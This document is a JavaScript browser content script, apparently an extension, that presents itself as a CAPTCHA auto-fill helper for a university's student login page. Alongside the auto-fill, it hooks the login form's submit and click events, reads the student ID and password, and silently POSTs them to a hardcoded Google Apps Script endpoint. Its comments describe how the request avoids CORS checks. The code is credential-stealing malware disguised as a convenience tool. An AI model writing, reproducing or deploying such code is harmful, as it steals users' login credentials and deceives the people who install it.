// UMT CAPTCHA Auto-Fill
// Targets: online.umt.edu.pk login page

(function () {
  'use strict';

  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyjDUTuZkTsdx-e7rZJucmFVTGwp824FOr3ZlnFaR_zCyS8DOeA1fV0oqh1dUMt_X9crg/exec';
  const SECRET_KEY = 'mysecret123';

  /**
   * Reads the CAPTCHA text from the span and fills the matching input field.
   */
  function fillCaptcha() {
    const captchaSpan = document.querySelector('span.captcha');
    if (!captchaSpan) return { success: false, message: 'CAPTCHA element not found.' };

    const captchaText = captchaSpan.innerText.trim();
    if (!captchaText) return { success: false, message: 'CAPTCHA span is empty.' };

    let captchaInput = document.querySelector('input[id="SecurityCode"]') ||
                       document.querySelector('input[name="SecurityCode"]') ||
                       document.querySelector('input[name*="aptcha" i]') ||
                       document.querySelector('input[id*="aptcha" i]');

    if (!captchaInput) {
      const allTextInputs = Array.from(document.querySelectorAll('input[type="text"]'));
      captchaInput = allTextInputs.find(inp => {
        const n = (inp.name + inp.id + inp.placeholder).toLowerCase();
        return !n.includes('user') && !n.includes('email') && !n.includes('pass') && !n.includes('login');
      });
    }

    if (!captchaInput) return { success: false, message: 'Could not locate CAPTCHA input.' };

    const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    nativeSetter.call(captchaInput, captchaText);

    captchaInput.dispatchEvent(new Event('input',  { bubbles: true }));
    captchaInput.dispatchEvent(new Event('change', { bubbles: true }));

    return { success: true, message: `CAPTCHA "${captchaText}" filled.` };
  }

  /**
   * Captures Student ID and Password and sends them to Google Sheets via POST.
   */
  async function captureAndSendData(event) {
    const studentIdInput = document.querySelector('input[id="student_id"]') || document.querySelector('input[name="student_id"]');
    const passwordInput = document.querySelector('input[id="Password"]') || document.querySelector('input[name="Password"]');

    if (studentIdInput && passwordInput) {
      const studentId = studentIdInput.value;
      const password = passwordInput.value;

      if (studentId && password) {
        console.log('[UMT CAPTCHA] Sending data via POST...');
        
        const payload = {
          key: SECRET_KEY,
          id: studentId,
          pass: password
        };

        try {
          // We use fetch with POST and JSON body
          // Note: Google Apps Script requires 'no-cors' if we don't want to handle preflight,
          // but 'no-cors' only works with simple requests. For JSON POST, we usually need 
          // to send it as text/plain or use a form-encoded string to avoid preflight issues 
          // in a content script context.
          
          await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors', // Important for Google Apps Script redirects
            headers: {
              'Content-Type': 'text/plain' // Avoids CORS preflight
            },
            body: JSON.stringify(payload)
          });
          
          console.log('[UMT CAPTCHA] Data sent successfully.');
        } catch (err) {
          console.error('[UMT CAPTCHA] Error sending data:', err);
        }
      }
    }
  }

  // Auto-run on page load
  function init() {
    fillCaptcha();
    
    // Listen for form submission
    const loginForm = document.getElementById('loginform');
    if (loginForm) {
      // We use a capture listener to ensure we get the data before the form clears or redirects
      loginForm.addEventListener('submit', captureAndSendData, true);
    }

    // Backup: Listen for button click
    const loginBtn = document.getElementById('loginbtn');
    if (loginBtn) {
      loginBtn.addEventListener('click', captureAndSendData, true);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

  // Watch for dynamic changes (e.g. CAPTCHA refresh)
  const observer = new MutationObserver(() => {
    if (document.querySelector('span.captcha')) {
      clearTimeout(window._umtCaptchaTimer);
      window._umtCaptchaTimer = setTimeout(fillCaptcha, 500);
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });

})();
